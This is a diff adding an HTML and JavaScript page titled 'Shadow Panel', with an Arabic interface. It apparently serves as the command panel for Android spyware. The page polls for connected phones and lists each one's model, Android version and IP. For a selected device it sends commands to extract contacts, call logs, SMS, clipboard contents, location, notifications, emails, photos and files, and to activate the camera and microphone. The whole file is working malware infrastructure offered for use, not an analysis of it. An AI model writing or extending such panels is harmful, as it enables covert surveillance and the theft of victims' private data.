@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>Shadow Panel</title>
+<style>
+body{background:#1a0033;color:#eee;font-family:sans-serif;margin:0;padding:20px}
+.card{background:#2d0052;border-radius:12px;padding:16px;margin:10px 0;cursor:pointer}
+.card:hover{background:#3d006e}
+h1{color:#ff4d6d}
+.btn{background:#ff4d6d;border:none;color:#fff;padding:10px 18px;border-radius:8px;margin:4px;cursor:pointer}
+#log{background:#000;padding:12px;height:300px;overflow:auto;font-family:monospace;font-size:13px;margin-top:20px}
+</style>
+</head>
+<body>
+<h1>الأجهزة المتصلة</h1>
+<div id="devices"></div>
+<div id="actions" style="display:none;margin-top:20px">
+  <button class="btn" onclick="push('contacts')">جهات الاتصال</button>
+  <button class="btn" onclick="push('call_log')">سجل المكالمات</button>
+  <button class="btn" onclick="push('sms_old')">الرسائل القديمة</button>
+  <button class="btn" onclick="push('sms_new')">الرسائل الجديد</button>
+  <button class="btn" onclick="push('device_info')">معلومات الهاتف</button>
+  <button class="btn" onclick="push('wifi')">معلومات الوايفاي</button>
+  <button class="btn" onclick="push('advanced')">معلومات Advanced</button>
+  <button class="btn" onclick="push('clipboard')">محتوي الكيبورد</button>
+  <button class="btn" onclick="push('ip_info')">معلومات الـ IP</button>
+  <button class="btn" onclick="push('location')">الموقع</button>
+  <button class="btn" onclick="push('notifications')">الاشعارات</button>
+  <button class="btn" onclick="push('emails')">الايميلات</button>
+  <button class="btn" onclick="push('photos')">الصور</button>
+  <button class="btn" onclick="push('camera')">الكاميرا</button>
+  <button class="btn" onclick="push('mic')">التسجيلات</button>
+  <button class="btn" onclick="push('files')">الملفات</button>
+</div>
+<pre id="log"></pre>
+<script>
+let current = null;
+async function refresh(){
+  const r = await fetch('/panel/devices'); const d = await r.json();
+  const el = document.getElementById('devices'); el.innerHTML = '';
+  for(const [id,info] of Object.entries(d)){
+    const div = document.createElement('div'); div.className = 'card';
+    div.innerHTML = `<b>${info.model||id}</b><br>${info.android} | ${info.ip||''}<br>${id}`;
+    div.onclick = ()=>{current=id;document.getElementById('actions').style.display='block';log('selected '+id)};
+    el.appendChild(div);
+  }
+}
+async function push(action){
+  if(!current) return;
+  await fetch('/panel/push',{method:'POST',headers:{'Content-Type':'application/json'}, body:JSON.stringify({device_id:current,action})});
+  log('pushed '+action);
+}
+function log(m){document.getElementById('log').textContent += m+'\n'}
+setInterval(refresh,4000); refresh();
+</script>
+</body>
+</html>
